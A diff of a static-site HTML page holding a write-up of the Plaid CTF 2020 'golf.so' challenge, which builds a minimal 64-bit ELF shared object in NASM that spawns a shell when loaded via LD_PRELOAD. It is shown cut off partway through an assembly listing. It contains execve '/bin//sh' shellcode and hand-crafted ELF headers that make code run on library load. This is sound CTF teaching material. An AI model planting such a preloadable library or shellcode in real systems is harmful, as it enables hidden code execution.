@@ -1,324 +1,199 @@
-<!doctype html><html lang=en-us>
-<head>
-<meta charset=utf-8>
-<meta name=author content>
-<meta name=description content>
-<meta name=keywords content>
-<meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name=generator content="Hugo 0.88.1">
-<link rel=canonical href=https://starfleetcadet75.github.io/posts/plaid-2020-golf-so/>
-<meta property="og:title" content="Plaid CTF 2020: golf.so">
-<meta property="og:description" content="Upload a 64-bit ELF shared object of size at most 1024 bytes. It should spawn a shell when loaded using LD_PRELOAD">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://starfleetcadet75.github.io/posts/plaid-2020-golf-so/"><meta property="article:section" content="posts">
-<meta property="article:published_time" content="2020-04-20T00:00:00+00:00">
-<meta property="article:modified_time" content="2020-04-20T00:00:00+00:00">
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="Plaid CTF 2020: golf.so">
-<meta name=twitter:description content="Upload a 64-bit ELF shared object of size at most 1024 bytes. It should spawn a shell when loaded using LD_PRELOAD">
-<meta itemprop=name content="Plaid CTF 2020: golf.so">
-<meta itemprop=description content="Upload a 64-bit ELF shared object of size at most 1024 bytes. It should spawn a shell when loaded using LD_PRELOAD"><meta itemprop=datePublished content="2020-04-20T00:00:00+00:00">
-<meta itemprop=dateModified content="2020-04-20T00:00:00+00:00">
-<meta itemprop=wordCount content="1474">
-<meta itemprop=keywords content="programming,">
-<link rel=stylesheet href=/css/layout.css>
-<link rel=stylesheet href=/css/default-dark.css>
-<link rel=stylesheet href=/css/adoc-html5-extension.css>
-<title>
-Plaid CTF 2020: golf.so
-</title>
-</head>
-<body>
-<div class=main>
-<header>
-<div class=header-bar>
-<nav>
-<div class=siteTitle>
-<a href=https://starfleetcadet75.github.io/>starfleetcadet75</a>
-</div>
-<a class=nav-item href=/about/><div class=nav-item-title>About</div></a>
-<a class=nav-item href=/readinglist/><div class=nav-item-title>Reading List</div></a>
-<a class="nav-item active" href=/posts/><div class=nav-item-title>Posts</div></a>
-</nav>
-<div class=social-links-header style=visibility:hidden;display:none>
-<a href=mailto:starfleetcadet75@gmail.com><div class=social-link>email</div></a>
-<a href=https://github.com/starfleetcadet75 target=_blank><div class=social-link>gh</div></a>
-<a href=https://gitlab.com/starfleetcadet75 target=_blank><div class=social-link>gl</div></a>
-</div>
-</div>
-</header>
-<article class=post>
-<h1 class=title> Plaid CTF 2020: golf.so </h1>
-<div class=content> <p><strong>Category:</strong> Misc<br>
-<strong>Points:</strong> 500</p>
-<h2 id=challenge>Challenge</h2>
-<p><img src=https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-PlaidCTF/golf.so/golf.png alt=golf></p>
-<p>This challenge required the creation of a 64-bit ELF shared library that spawns a shell when loaded by a process.
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content><meta name=description content><meta name=keywords content><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.99.1"><link rel=canonical href=https://starfleetcadet75.github.io/posts/plaid-2020-golf-so/><meta property="og:title" content="Plaid CTF 2020: golf.so"><meta property="og:description" content="Upload a 64-bit ELF shared object of size at most 1024 bytes. It should spawn a shell when loaded using LD_PRELOAD"><meta property="og:type" content="article"><meta property="og:url" content="https://starfleetcadet75.github.io/posts/plaid-2020-golf-so/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-04-20T00:00:00+00:00"><meta property="article:modified_time" content="2020-04-20T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Plaid CTF 2020: golf.so"><meta name=twitter:description content="Upload a 64-bit ELF shared object of size at most 1024 bytes. It should spawn a shell when loaded using LD_PRELOAD"><meta itemprop=name content="Plaid CTF 2020: golf.so"><meta itemprop=description content="Upload a 64-bit ELF shared object of size at most 1024 bytes. It should spawn a shell when loaded using LD_PRELOAD"><meta itemprop=datePublished content="2020-04-20T00:00:00+00:00"><meta itemprop=dateModified content="2020-04-20T00:00:00+00:00"><meta itemprop=wordCount content="1474"><meta itemprop=keywords content="programming,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=stylesheet href=/css/adoc-html5-extension.css><title>Plaid CTF 2020: golf.so</title></head><body><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=https://starfleetcadet75.github.io/>starfleetcadet75</a></div><a class=nav-item href=/about/><div class=nav-item-title>About</div></a><a class=nav-item href=/readinglist/><div class=nav-item-title>Reading List</div></a><a class="nav-item active" href=/posts/><div class=nav-item-title>Posts</div></a></nav><div class=social-links-header style=visibility:hidden;display:none><a href=mailto:starfleetcadet75@gmail.com><div class=social-link>email</div></a><a href=https://github.com/starfleetcadet75 target=_blank><div class=social-link>gh</div></a><a href=https://gitlab.com/starfleetcadet75 target=_blank><div class=social-link>gl</div></a></div></div></header><article class=post><h1 class=title>Plaid CTF 2020: golf.so</h1><div class=content><p><strong>Category:</strong> Misc<br><strong>Points:</strong> 500</p><h2 id=challenge>Challenge</h2><p><img src=https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-PlaidCTF/golf.so/golf.png alt=golf></p><p>This challenge required the creation of a 64-bit ELF shared library that spawns a shell when loaded by a process.
 Windows libraries typically contain a <a href=https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain>DllMain</a> function that is invoked whenever the libary is loaded by <code>LoadLibrary</code>.
 The Linux equivalent is to mark a function as a special global constructor.
-We can do this in GCC with <code>__attribute__((constructor))</code>.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>__attribute__((constructor)) <span style=color:#66d9ef>void</span> shell() {
-    __asm__(
-        <span style=color:#e6db74>&#34;mov $231, %rax;&#34;</span>  <span style=color:#75715e>// sys_exit_group
-</span><span style=color:#75715e></span>        <span style=color:#e6db74>&#34;mov $42, %rdi;&#34;</span>   <span style=color:#75715e>// int status
-</span><span style=color:#75715e></span>        <span style=color:#e6db74>&#34;syscall;&#34;</span>
-    );
-}
-</code></pre></div><p>This code will simply invoke the <code>exit_group</code> syscall with an argument of 42 whenever it gets loaded by the process.
+We can do this in GCC with <code>__attribute__((constructor))</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>__attribute__((constructor)) <span style=color:#66d9ef>void</span> shell() {
+</span></span><span style=display:flex><span>    __asm__(
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;mov $231, %rax;&#34;</span>  <span style=color:#75715e>// sys_exit_group
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#e6db74>&#34;mov $42, %rdi;&#34;</span>   <span style=color:#75715e>// int status
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#e6db74>&#34;syscall;&#34;</span>
+</span></span><span style=display:flex><span>    );
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>This code will simply invoke the <code>exit_group</code> syscall with an argument of 42 whenever it gets loaded by the process.
 We can compile it with <code>gcc golf.c -shared -s -nostdlib -nodefaultlibs -nostartfiles -o golf.so</code>, which will help save space.
 To test that our function gets called, we run the library with <code>strace -E LD_PRELOAD=./golf.so /bin/true</code>.
-The last line of the strace output prints <code>exit_group(42)</code>, which confirms that our code did indeed execute when loaded by <code>/bin/true</code>.</p>
-<p>Despite stripping the binary, using only three assembly instructions, and avoiding the standard library, we still end up with an object of over 13k bytes in size.</p>
-<h2 id=custom-elf-binary>Custom ELF Binary</h2>
-<p>There is a good tutorial <a href=https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html>here</a> on how to create a minimal 32-bit ELF executable.
-Doing this requires us to ditch GCC completely and define our own ELF structures in assembly.</p>
-<p>The first step is to update the 32-bit ELF structure to the 64-bit version.
-Fortunately, someone has <a href=https://blog.stalkr.net/2014/10/tiny-elf-3264-with-nasm.html>already ported</a> the code from the previous link.</p>
-<p>You can read about the different ELF structures, including what fields changed, by running <code>man elf</code>.
-The layout is as follows:</p>
-<p><img src=https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Elf-layout--en.svg/390px-Elf-layout--en.svg.png alt=elf></p>
-<p>The ELF header appears at the start of the binary.
+The last line of the strace output prints <code>exit_group(42)</code>, which confirms that our code did indeed execute when loaded by <code>/bin/true</code>.</p><p>Despite stripping the binary, using only three assembly instructions, and avoiding the standard library, we still end up with an object of over 13k bytes in size.</p><h2 id=custom-elf-binary>Custom ELF Binary</h2><p>There is a good tutorial <a href=https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html>here</a> on how to create a minimal 32-bit ELF executable.
+Doing this requires us to ditch GCC completely and define our own ELF structures in assembly.</p><p>The first step is to update the 32-bit ELF structure to the 64-bit version.
+Fortunately, someone has <a href=https://blog.stalkr.net/2014/10/tiny-elf-3264-with-nasm.html>already ported</a> the code from the previous link.</p><p>You can read about the different ELF structures, including what fields changed, by running <code>man elf</code>.
+The layout is as follows:</p><p><img src=https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Elf-layout--en.svg/390px-Elf-layout--en.svg.png alt=elf></p><p>The ELF header appears at the start of the binary.
 It contains the magic value that identifies this as an ELF file, the address of the entry point, the number of program headers that need to be parsed, and the offset to those program headers.
 When an ELF is loaded by the kernel, every program header marked with type PT_LOAD is loaded into process memory.
-The section header table and the section metadata is not needed for the program to actually run, so we will omit them to save space.</p>
-<p>Adding shellcode from <a href=https://www.exploit-db.com/shellcodes/46907>https://www.exploit-db.com/shellcodes/46907</a> to our file, we end up with the following initial code:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>BITS</span> <span style=color:#ae81ff>64</span>
-
-ehdr:                               <span style=color:#75715e>; Elf64_Ehdr
-</span><span style=color:#75715e></span>        <span style=color:#a6e22e>db</span>  <span style=color:#ae81ff>0x7f</span>, <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#66d9ef>ELF</span><span style=color:#960050;background-color:#1e0010>&#34;</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span> <span style=color:#75715e>; e_ident
-</span><span style=color:#75715e></span><span style=color:#66d9ef>times</span> <span style=color:#ae81ff>8</span> <span style=color:#66d9ef>db</span>  <span style=color:#ae81ff>0</span>
-        <span style=color:#a6e22e>dw</span>  <span style=color:#ae81ff>3</span>                       <span style=color:#75715e>; e_type
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0x3e</span>                    <span style=color:#75715e>; e_machine
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; e_version
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>shell</span>                   <span style=color:#75715e>; e_entry
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>phdr</span> - <span style=color:#66d9ef>$$</span>               <span style=color:#75715e>; e_phoff
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shoff
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_flags
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>ehdrsize</span>                <span style=color:#75715e>; e_ehsize
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>phdrsize</span>                <span style=color:#75715e>; e_phentsize
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; e_phnum
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shentsize
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shnum
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shstrndx
-</span><span style=color:#75715e></span><span style=color:#66d9ef>ehdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>ehdr</span>
-
-phdr:                               <span style=color:#75715e>; Elf64_Phdr
-</span><span style=color:#75715e></span>        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; p_type
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>5</span>                       <span style=color:#75715e>; p_flags
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; p_offset
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_vaddr
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_paddr
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>filesize</span>                <span style=color:#75715e>; p_filesz
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>filesize</span>                <span style=color:#75715e>; p_memsz
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0x1000</span>                  <span style=color:#75715e>; p_align
-</span><span style=color:#75715e></span><span style=color:#66d9ef>phdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>phdr</span>
-
-shell:
-        <span style=color:#a6e22e>xor</span>  <span style=color:#66d9ef>rsi</span>,<span style=color:#66d9ef>rsi</span>
-        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rsi</span>
-        <span style=color:#a6e22e>mov</span>  <span style=color:#66d9ef>rdi</span>,<span style=color:#ae81ff>0x68732f2f6e69622f</span>
-        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rdi</span>
-        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rsp</span>
-        <span style=color:#a6e22e>pop</span>  <span style=color:#66d9ef>rdi</span>
-        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>59</span>
-        <span style=color:#a6e22e>pop</span>  <span style=color:#66d9ef>rax</span>
-        <span style=color:#a6e22e>cdq</span>
-        <span style=color:#a6e22e>syscall</span>
-<span style=color:#a6e22e>filesize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>$$</span>
-</code></pre></div><p>The Elf64_Ehdr is the ELF header and Elf64_Phdr is a single program header of type PT_LOAD.
+The section header table and the section metadata is not needed for the program to actually run, so we will omit them to save space.</p><p>Adding shellcode from <a href=https://www.exploit-db.com/shellcodes/46907>https://www.exploit-db.com/shellcodes/46907</a> to our file, we end up with the following initial code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>BITS</span> <span style=color:#ae81ff>64</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ehdr:                               <span style=color:#75715e>; Elf64_Ehdr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>db</span>  <span style=color:#ae81ff>0x7f</span>, <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#66d9ef>ELF</span><span style=color:#960050;background-color:#1e0010>&#34;</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span> <span style=color:#75715e>; e_ident
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>times</span> <span style=color:#ae81ff>8</span> <span style=color:#66d9ef>db</span>  <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dw</span>  <span style=color:#ae81ff>3</span>                       <span style=color:#75715e>; e_type
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0x3e</span>                    <span style=color:#75715e>; e_machine
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; e_version
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>shell</span>                   <span style=color:#75715e>; e_entry
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>phdr</span> - <span style=color:#66d9ef>$$</span>               <span style=color:#75715e>; e_phoff
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shoff
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_flags
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>ehdrsize</span>                <span style=color:#75715e>; e_ehsize
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>phdrsize</span>                <span style=color:#75715e>; e_phentsize
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; e_phnum
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shentsize
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shnum
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shstrndx
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>ehdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>ehdr</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>phdr:                               <span style=color:#75715e>; Elf64_Phdr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; p_type
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>5</span>                       <span style=color:#75715e>; p_flags
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; p_offset
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_vaddr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_paddr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>filesize</span>                <span style=color:#75715e>; p_filesz
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>filesize</span>                <span style=color:#75715e>; p_memsz
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0x1000</span>                  <span style=color:#75715e>; p_align
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>phdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>phdr</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>shell:
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>xor</span>  <span style=color:#66d9ef>rsi</span>,<span style=color:#66d9ef>rsi</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rsi</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>mov</span>  <span style=color:#66d9ef>rdi</span>,<span style=color:#ae81ff>0x68732f2f6e69622f</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rdi</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rsp</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>pop</span>  <span style=color:#66d9ef>rdi</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>59</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>pop</span>  <span style=color:#66d9ef>rax</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>cdq</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>syscall</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>filesize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>$$</span>
+</span></span></code></pre></div><p>The Elf64_Ehdr is the ELF header and Elf64_Phdr is a single program header of type PT_LOAD.
 Normally a program would contain at least two program headers; one for code and one for data.
-However since this is not a requirement and we are trying to save space, we can condense the entire contents of the binary into the same segment.</p>
-<p>Next we change the <code>e_type</code> field from 2 to 3, which indicates that this is a shared object and not an executable.
-Since we manually laid out the ELF structures, we need NASM to output this as a flat binary:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nasm -f bin golf.asm -o golf.so
-</code></pre></div><p>We are met with an interesting error when running this.
-The <code>file</code> utility also gives an unexpected output.</p>
-<p><img src=https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-PlaidCTF/golf.so/error.png alt=error></p>
-<p>For some reason, <code>file</code> still thinks this is an executable despite the modified <code>e_type</code> field.
+However since this is not a requirement and we are trying to save space, we can condense the entire contents of the binary into the same segment.</p><p>Next we change the <code>e_type</code> field from 2 to 3, which indicates that this is a shared object and not an executable.
+Since we manually laid out the ELF structures, we need NASM to output this as a flat binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nasm -f bin golf.asm -o golf.so
+</span></span></code></pre></div><p>We are met with an interesting error when running this.
+The <code>file</code> utility also gives an unexpected output.</p><p><img src=https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-PlaidCTF/golf.so/error.png alt=error></p><p>For some reason, <code>file</code> still thinks this is an executable despite the modified <code>e_type</code> field.
 If we look back at the original GCC library we compiled, we notice that there is a program header of type PT_DYNAMIC.
 It turns out that, in addition to requiring at least one PT_LOAD segment, <a href=https://michalmalik.github.io/elf-dynamic-segment-struggles>a shared library also requires a PT_DYNAMIC segment</a>.
-In fact, the PT_DYNAMIC metadata is where we can indicate that a function is a global constructor by adding a DT_INIT entry.</p>
-<p>Since segments can overlap, we can stick the PT_DYNAMIC segment inside of the already defined PT_LOAD one.
-We just need to define a second program header and add the minimum required contents.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>BITS</span> <span style=color:#ae81ff>64</span>
-
-ehdr:                               <span style=color:#75715e>; Elf64_Ehdr
-</span><span style=color:#75715e></span>        <span style=color:#a6e22e>db</span>  <span style=color:#ae81ff>0x7f</span>, <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#66d9ef>ELF</span><span style=color:#960050;background-color:#1e0010>&#34;</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span> <span style=color:#75715e>; e_ident
-</span><span style=color:#75715e></span><span style=color:#66d9ef>times</span> <span style=color:#ae81ff>8</span> <span style=color:#66d9ef>db</span>  <span style=color:#ae81ff>0</span>
-        <span style=color:#a6e22e>dw</span>  <span style=color:#ae81ff>3</span>                       <span style=color:#75715e>; e_type
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0x3e</span>                    <span style=color:#75715e>; e_machine
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; e_version
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>shell</span>                   <span style=color:#75715e>; e_entry
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>phdr</span> - <span style=color:#66d9ef>$$</span>               <span style=color:#75715e>; e_phoff
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shoff
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_flags
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>ehdrsize</span>                <span style=color:#75715e>; e_ehsize
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>phdrsize</span>                <span style=color:#75715e>; e_phentsize
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>2</span>                       <span style=color:#75715e>; e_phnum
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shentsize
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shnum
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shstrndx
-</span><span style=color:#75715e></span><span style=color:#66d9ef>ehdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>ehdr</span>
-
-phdr:                               <span style=color:#75715e>; Elf64_Phdr
-</span><span style=color:#75715e></span>        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; p_type
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>7</span>                       <span style=color:#75715e>; p_flags
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; p_offset
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_vaddr
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_paddr
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>progsize</span>                <span style=color:#75715e>; p_filesz
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>progsize</span>                <span style=color:#75715e>; p_memsz
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0x1000</span>                  <span style=color:#75715e>; p_align
-</span><span style=color:#75715e></span><span style=color:#66d9ef>phdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>phdr</span>
-        <span style=color:#75715e>; PT_DYNAMIC segment
-</span><span style=color:#75715e></span>        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>2</span>                       <span style=color:#75715e>; p_type
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>7</span>                       <span style=color:#75715e>; p_flags
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_offset
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_vaddr
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_paddr
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynsize</span>                 <span style=color:#75715e>; p_filesz
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynsize</span>                 <span style=color:#75715e>; p_memsz
